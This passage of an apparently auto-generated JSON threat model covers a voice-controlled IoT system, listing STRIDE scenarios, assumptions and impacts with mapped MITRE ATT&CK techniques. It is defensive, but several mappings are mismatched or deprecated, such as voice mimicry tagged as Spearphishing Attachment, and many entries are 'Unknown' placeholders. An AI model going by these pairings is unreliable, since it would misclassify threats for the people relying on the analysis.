            "Potential Impact": "Unauthorized access to historical voice command data compromising user privacy.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud services",
                "data access",
                "voice commands"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability to access server-side logs.",
            "Assumptions": [
                {
                    "Assumption": "Server-side logs contain sensitive information.",
                    "Role": "System Design",
                    "Condition": "Logs capture and store sensitive data."
                },
                {
                    "Assumption": "Vulnerabilities in server-side applications are not patched.",
                    "Role": "System Administration",
                    "Condition": "Servers are not kept up-to-date with security patches."
                },
                {
                    "Assumption": "Logs are not securely stored or encrypted.",
                    "Role": "System Design",
                    "Condition": "Log files are not stored with proper encryption mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized access to logs revealing sensitive user information and actions.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "server logs",
                "vulnerability exploitation",
                "data access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the server with excessive voice commands to exhaust resources.",
            "Assumptions": [
                {
                    "Assumption": "Server lacks rate limiting on incoming requests.",
                    "Role": "System Design",
                    "Condition": "The server does not enforce request rate limits."
                },
                {
                    "Assumption": "The server is not scalable to handle unexpected high loads.",
                    "Role": "System Design",
                    "Condition": "The server architecture does not support scaling under high load."
                },
                {
                    "Assumption": "The attacker has the ability to generate a high volume of requests.",
                    "Role": "Attackers",
                    "Condition": "The attacker can automate and deploy large-scale request generation."
                }
            ],
            "Potential Impact": "Server performance degradation, limiting legitimate user access and affecting service reliability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "server",
                "voice commands"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disrupts communication between the client-side application and IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "No redundancy or failover mechanisms in communication channels.",
                    "Role": "System Design",
                    "Condition": "Communication relies on a single channel with no redundancy."
                },
                {
                    "Assumption": "The network infrastructure is susceptible to targeted attacks.",
                    "Role": "Network Security",
                    "Condition": "The attacker can disrupt or hijack communication channels easily."
                },
                {
                    "Assumption": "Lack of proper monitoring and alerting on communication failures.",
                    "Role": "System Design",
                    "Condition": "The system does not monitor or alert on unusual communication disruptions."
                }
            ],
            "Potential Impact": "Loss of control over IoT devices, potentially affecting critical operations and availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "communication disruption",
                "IoT controller",
                "client-side"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker uses malware to cause widespread disruption of IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices run unverified code.",
                    "Role": "System Design",
                    "Condition": "Devices execute code without verification or validation."
                },
                {
                    "Assumption": "Malware can propagate through networked IoT devices.",
                    "Role": "Network Security",
                    "Condition": "Network lacks segmentation or containment controls."
                },
                {
                    "Assumption": "IoT devices do not have malware detection mechanisms.",
                    "Role": "System Design",
                    "Condition": "Devices lack embedded malware detection and response capabilities."
                }
            ],
            "Potential Impact": "Widespread IoT device malfunction, leading to a loss of availability and potential physical consequences.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "IoT devices",
                "network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the client-side application to gain unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Client-side application contains security vulnerabilities.",
                    "Role": "Application Development",
                    "Condition": "Vulnerabilities exist due to insecure coding practices."
                },
                {
                    "Assumption": "User devices are not protected with endpoint security software.",
                    "Role": "User Security",
                    "Condition": "Users do not deploy security software on their devices."
                },
                {
                    "Assumption": "Attackers can identify and exploit client-side vulnerabilities.",
                    "Role": "Attackers",
                    "Condition": "Attackers have the tools and knowledge to exploit existing vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized access and control over sensitive user data and application functions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "client-side",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to the IoT controller through weak authentication.",
            "Assumptions": [
                {
                    "Assumption": "IoT controller uses weak or default credentials.",
                    "Role": "System Administration",
                    "Condition": "Default or weak passwords are used without enforcement of strong credential policies."
                },
                {
                    "Assumption": "Lack of multi-factor authentication for administrative access.",
                    "Role": "System Design",
                    "Condition": "The system does not require multi-factor authentication for critical commands."
                },
                {
                    "Assumption": "Attackers have the capability to perform brute-force attacks.",
                    "Role": "Attackers",
                    "Condition": "Attackers can perform brute-force or credential stuffing attacks."
                }
            ],
            "Potential Impact": "Complete control over IoT devices, leading to unauthorized actions and system compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "weak credentials",
                "IoT controller",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a backdoor to gain elevated access to the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "Server-side application has not been hardened against backdoors.",
                    "Role": "System Administration",
                    "Condition": "Backdoor vulnerabilities exist due to lack of proper security hardening."
                },
                {
                    "Assumption": "Lack of proper monitoring and incident response.",
                    "Role": "System Design",
                    "Condition": "No effective monitoring or response mechanisms for detecting unauthorized access."
                },
                {
                    "Assumption": "Adversaries possess advanced persistent threat capabilities.",
                    "Role": "Attackers",
                    "Condition": "Attackers have advanced techniques to maintain persistent and elevated access."
                }
            ],
            "Potential Impact": "Extended and elevated unauthorized access to server functionality and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "backdoor",
                "server-side",
                "advanced persistent threat"
            ],
            "mitre_technique": {
                "name": "Reflective Code Loading",
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
                "id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a",
                "technique_id": "T1620"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "17",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics a legitimate user's voice to issue malicious commands to the IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The system relies solely on voice recognition for authentication.",
                    "Role": "System Designer",
                    "Condition": "Voice recognition technology is in use without any additional authentication mechanism."
                },
                {
                    "Assumption": "The attacker has access to recordings of the legitimate user's voice.",
                    "Role": "Attacker",
                    "Condition": "Voice recordings are obtainable through social engineering or eavesdropping."
                },
                {
                    "Assumption": "The attacker has the technical capability to generate commands using the recordings.",
                    "Role": "Attacker",
                    "Condition": "The attacker has sufficient technical expertise and tools to utilize voice recordings effectively."
                }
            ],
            "Potential Impact": "Unauthorized control over IoT devices, leading to potential security breaches and physical actions.",
            "MITRE ATT&CK Keywords": [
                "voice mimicry",
                "social engineering",
                "IoT device control"
            ],
            "mitre_technique": {
                "name": "Spearphishing Attachment",
                "description": "Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
                "id": "attack-pattern--6aac77c4-eaf2-4366-8c13-ce50ab951f38",
                "technique_id": "T1193"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sends commands masquerading as a legitimate cloud service to the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "The system doesn't validate the authenticity of incoming requests from cloud services.",
                    "Role": "System Designer",
                    "Condition": "No endpoint validation mechanisms are implemented."
                },
                {
                    "Assumption": "The attacker has access to network communication details.",
                    "Role": "Attacker",
                    "Condition": "Network traffic is inadequately protected, enabling eavesdropping."
                },
                {
                    "Assumption": "The attacker can generate requests that mimic the format of legitimate cloud service requests.",
                    "Role": "Attacker",
                    "Condition": "The attacker has technical capabilities and tools to analyze and replicate cloud service request formats."
                }
            ],
            "Potential Impact": "Unauthorized data manipulation and tampering with IoT device commands.",
            "MITRE ATT&CK Keywords": [
                "cloud spoofing",
                "network eavesdropping",
                "request forgery"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of an IoT controller to send malicious commands to the IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks mutual authentication between the IoT controller and devices.",
                    "Role": "System Designer",
                    "Condition": "No mutual authentication mechanisms are implemented."
                },
                {
                    "Assumption": "The attacker has network access to intercept and alter IoT controller communications.",
                    "Role": "Attacker",
                    "Condition": "Network security is compromised, allowing interception."
                },
                {
                    "Assumption": "The attacker possesses or can generate the necessary credentials or tokens mimicking the IoT controller.",
                    "Role": "Attacker",
                    "Condition": "Weak authentication mechanisms are in place that can be compromised."
                }
            ],
            "Potential Impact": "Unauthorized control and potential misuse of IoT devices leading to operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "IoT controller spoofing",
                "network hijacking",
                "command injection"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the client-side application to intercept and alter voice commands before they reach the server.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can gain physical or remote access to the client device.",
                    "Role": "Attacker",
                    "Condition": "Device security is insufficient to prevent unauthorized access."
                },
                {
                    "Assumption": "The attacker has the skills to decompile, alter, and repackage the application.",
                    "Role": "Attacker",
                    "Condition": "The attacker has advanced technical skills and tools for reverse engineering."
                },
                {
                    "Assumption": "The communication between client-side and server-side is not sufficiently protected.",
                    "Role": "System Designer",
                    "Condition": "Lack of encryption or other secure communication protocols."
                }
            ],
            "Potential Impact": "Data integrity compromise and unauthorized command execution, potentially causing harmful actions on IoT devices.",
            "MITRE ATT&CK Keywords": [
                "application tampering",
                "communication interception",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a vulnerability in the IoT controller software to change the firmware and modify its behavior.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller firmware has known vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Publicly known or exploitable vulnerabilities exist in the firmware."
                },
                {
                    "Assumption": "Firmware updates are not securely validated before installation.",
                    "Role": "System Designer",
                    "Condition": "Insufficient firmware integrity checks."
                },
                {
                    "Assumption": "The attacker has network or physical access to initiate a firmware update process.",
                    "Role": "Attacker",
                    "Condition": "Access controls and physical security of devices are inadequate."
                }
            ],
            "Potential Impact": "Compromised integrity and functionality of IoT devices, leading to unauthorized behaviors.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "vulnerability exploitation",
                "IoT device hacking"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies the server-side processing logic to alter the responses or commands issued to IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application has vulnerabilities that can be exploited.",
                    "Role": "Attacker",
                    "Condition": "Server-side software has security flaws or misconfigurations."
                },
                {
                    "Assumption": "The attacker has the capability to inject malicious code into the server logic.",
                    "Role": "Attacker",
                    "Condition": "Access to development or deployment environments is insufficiently protected."
                },
                {
                    "Assumption": "There is inadequate monitoring and anomaly detection for server-side activities.",
                    "Role": "System Administrator",
                    "Condition": "Lack of comprehensive logging and monitoring mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized and potentially harmful actions executed by IoT devices, compromising data integrity and system functionality.",
            "MITRE ATT&CK Keywords": [
                "server-side tampering",
                "code injection",
                "response manipulation"
            ],
            "mitre_technique": {
                "name": "Dynamic-link Library Injection",
                "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
                "technique_id": "T1055.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user disputes the actions performed by IoT devices, claiming they did not issue the voice commands.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging of user interactions and voice commands.",
                    "Role": "System Designer",
                    "Condition": "Lack of comprehensive audit logs for command and control actions."
                },
                {
                    "Assumption": "No robust mechanism to authenticate individual user actions.",
                    "Role": "System Designer",
                    "Condition": "Authentication mechanisms do not link actions to specific users reliably."
                },
                {
                    "Assumption": "Users have access to IoT devices that can be shared among multiple individuals.",
                    "Role": "User",
                    "Condition": "Multiple users access the same IoT devices without individual user tracking."
                }
            ],
            "Potential Impact": "Loss of data integrity accountability and potential security vulnerabilities due to disputed actions.",
            "MITRE ATT&CK Keywords": [
                "action repudiation",
                "insufficient logging",
                "user authentication failure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An administrative user denies making configuration changes to the IoT controller, causing a system malfunction.",
            "Assumptions": [
                {
                    "Assumption": "No auditing mechanism for administrative changes.",
                    "Role": "System Administrator",
                    "Condition": "Lack of logging and monitoring of administrative activities."
                },
                {
                    "Assumption": "Shared administrative credentials among multiple administrators.",
                    "Role": "System Administrator",
                    "Condition": "Administrative accounts are not individualized."
                },
                {
                    "Assumption": "Insufficient access control policies for making sensitive changes.",
                    "Role": "System Designer",
                    "Condition": "Weak or poorly implemented access control measures."
                }
            ],
            "Potential Impact": "compromised system integrity and potential system dysfunction due to unauthorized or misattributed changes.",
            "MITRE ATT&CK Keywords": [
                "administrative repudiation",
                "configuration changes",
                "access control failure"
            ],
            "mitre_technique": {
                "name": "SNMP (MIB Dump)",
                "description": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5",
                "technique_id": "T1602.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Server-side logs can be manipulated or deleted, allowing unauthorized actions to go untracked and unpunished.",
            "Assumptions": [
                {
                    "Assumption": "Server logs are accessible to unauthorized personnel or can be easily tampered with.",
                    "Role": "System Administrator",
                    "Condition": "Logs are not secured or protected from modification/deletion."
                },
                {
                    "Assumption": "No tamper-evident mechanisms are in place for logs.",
                    "Role": "System Designer",
                    "Condition": "Logs can be altered without detection."
                },
                {
                    "Assumption": "Lack of regular backups or archival of logs for integrity checking.",
                    "Role": "System Administrator",
                    "Condition": "Backup and archival processes are not implemented."
                }
            ],
            "Potential Impact": "Ability to perform undetectable malicious actions, compromising system integrity and accountability.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "unauthorized access",
                "insufficient logging protection"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted communications between the client-side and server-side applications.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "No encryption protocols implemented for data in transit."
                },
                {
                    "Assumption": "The attacker can eavesdrop on the network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network access permits interception of traffic."
                },
                {
                    "Assumption": "Sensitive data is transmitted across this channel.",
                    "Role": "System Designer",
                    "Condition": "Unencrypted transmission of sensitive information."
                }
            ],
            "Potential Impact": "Compromised data confidentiality due to unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "unencrypted communication",
                "network eavesdropping",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to the cloud storage where sensitive data is stored.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage security is inadequate.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Weak access controls or authentication mechanisms."
                },
                {
                    "Assumption": "Attackers have technical capability to bypass or exploit cloud security flaws.",
                    "Role": "Attacker",
                    "Condition": "Vulnerabilities or misconfigurations in cloud services."
                },
                {
                    "Assumption": "Sensitive data is stored in the cloud without additional encryption.",
                    "Role": "System Designer",
                    "Condition": "Lack of data encryption or other protective measures."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data stored in the cloud, compromising data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "cloud storage breach",
                "unauthorized access",
                "data theft"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
